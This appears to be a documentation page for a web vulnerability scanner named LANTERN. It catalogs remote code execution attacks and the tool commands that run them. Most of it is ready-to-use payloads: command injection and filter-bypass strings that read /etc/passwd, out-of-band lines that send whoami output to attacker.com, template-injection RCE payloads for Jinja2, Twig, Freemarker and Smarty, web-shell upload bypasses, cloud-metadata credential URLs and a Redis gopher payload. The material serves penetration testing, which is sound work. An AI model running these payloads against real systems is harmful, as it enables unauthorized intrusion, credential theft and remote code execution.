[← Back to Index](../INDEX.md)

# Remote Code Execution

When LANTERN finds RCE, it doesn't just report it - it proves it by extracting system information.

---

## Command Injection

### Detection Techniques

**Error-Based Detection**
```bash
; id                    # Unix command
| whoami                # Pipe to command
& ipconfig              # Windows command
`id`                    # Backtick execution
$(id)                   # Command substitution
```

**Time-Based Detection (Blind)**
```bash
; sleep 5               # Unix
& ping -n 5 127.0.0.1   # Windows
| timeout 5             # Alternative
```

**OOB Detection**
```bash
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

### Space Bypass Techniques

For filters blocking spaces:

```bash
cat${IFS}/etc/passwd              # $IFS = space/tab/newline
cat$IFS$9/etc/passwd              # $9 is empty but valid
{cat,/etc/passwd}                 # Brace expansion
cat</etc/passwd                   # Input redirection
X=$'cat\x20/etc/passwd';$X       # Hex encoding
```

### Quote Bypass Techniques

```bash
c''at /etc/passwd                 # Empty quotes
c""at /etc/passwd                 # Double quotes
c\at /etc/passwd                  # Backslash escape
/???/c?t /etc/passwd             # Wildcards
```

### Exploitation

Once confirmed, LANTERN extracts:
- Username (`whoami`)
- Hostname
- OS version (`uname -a` / `ver`)
- Network interfaces
- Current directory

```bash
lantern -t https://target.com -m cmdi --exploit
lantern -t https://target.com -m cmdi --oob-server --exploit
```

---

## Server-Side Template Injection (SSTI)

### Engine Detection

LANTERN sends polyglot payloads to identify the template engine:

```
{{7*7}}           # Jinja2, Twig → 49
${7*7}            # Freemarker, Velocity → 49
<%= 7*7 %>        # ERB → 49
#{7*7}            # Pebble → 49
#set($x=7*7)$x    # Velocity → 49
```

### Exploitation by Engine

**Jinja2 (Python)**
```python
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Twig (PHP)**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Freemarker (Java)**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Smarty (PHP)**
```php
{system('id')}
{php}system('id');{/php}
```

```bash
lantern -t https://target.com -m ssti --exploit --deep
```

---

## Insecure Deserialization

### Supported Formats

| Language | Format | Detection |
|----------|--------|-----------|
| **Java** | Serialized objects | `ac ed 00 05` magic bytes |
| **PHP** | `serialize()` | `O:N:"class"` pattern |
| **Python** | `pickle` | `cos\n`, `cposix\n` |
| **.NET** | `BinaryFormatter`, `ObjectStateFormatter` | `AAEAAAD` base64 |
| **Ruby** | `Marshal.dump` | `\x04\x08` prefix |
| **Node.js** | `node-serialize` | `_$$ND_FUNC$$_` |

### Exploitation

**Java (ysoserial chains)**
- CommonsCollections1-7
- Spring, Hibernate chains
- JNDI injection

**PHP**
- POP chains
- `__wakeup()`, `__destruct()`

**Python**
- `pickle.loads()` → RCE via `__reduce__`

```bash
lantern -t https://target.com -m deserial --exploit
```

---

## File Upload Bypass

### Bypass Techniques

| Technique | Example | Why It Works |
|-----------|---------|--------------|
| **Double Extension** | `shell.php.jpg` | Some servers check only last extension |
| **Null Byte** | `shell.php%00.jpg` | Truncates at null (PHP < 5.3.4) |
| **Case Variation** | `shell.pHp` | Case-insensitive file systems |
| **Alternate Extension** | `shell.phtml`, `.php5`, `.phar` | Alternate PHP handlers |
| **Content-Type Spoof** | Upload PHP, set `image/jpeg` | MIME check only |
| **Magic Bytes** | `GIF89a<?php` | Starts as image, contains PHP |
| **Polyglot** | Valid JPEG + PHP | Parsable as both |
| **SVG with XSS** | `<svg onload=alert(1)>` | Execute JS |
| **SVG with XXE** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Read files |
| **.htaccess** | `AddType application/x-httpd-php .txt` | Enable PHP for .txt |

### Shell Detection

After upload, LANTERN:
1. Attempts to locate uploaded file
2. Tests for code execution
3. Extracts system info if successful

```bash
lantern -t https://target.com -m upload --exploit
lantern -t https://target.com -m upload,cmdi --exploit --aggressive
```

---

## SSRF to RCE

### Cloud Metadata → Credentials

```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Internal Service Exploitation

| Service | Port | Exploitation |
|---------|------|--------------|
| **Redis** | 6379 | `CONFIG SET dir /var/www/html`, write webshell |
| **Memcached** | 11211 | Inject serialized objects |
| **Elasticsearch** | 9200 | Query data, modify indices |
| **Docker API** | 2375 | Create container, mount host filesystem |
| **Kubernetes** | 8080/6443 | List secrets, create pods |

### Gopher Protocol

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a...SHELL...
```

```bash
lantern -t https://target.com -m ssrf --oob-server --exploit
lantern -t https://target.com --chain rce --exploit
```

---

## Complete RCE Testing

```bash
# RCE chain (all RCE vectors)
lantern -t https://target.com --chain rce --exploit

# Individual modules
lantern -t https://target.com -m cmdi,ssti,deserial,upload,ssrf --exploit --deep --aggressive

# With OOB for blind detection
lantern -t https://target.com -m cmdi,ssti,ssrf --oob-server --exploit
```

---

## What Gets Extracted

When RCE is confirmed:

| Data | Command |
|------|---------|
| **Username** | `whoami` / `echo %USERNAME%` |
| **Hostname** | `hostname` |
| **OS Version** | `uname -a` / `ver` |
| **Current Directory** | `pwd` / `cd` |
| **Network Interfaces** | `ip addr` / `ipconfig` |
| **Environment Variables** | `env` / `set` |

All of this appears in the report with the exact command that worked.

---

[← Back to Index](../INDEX.md)
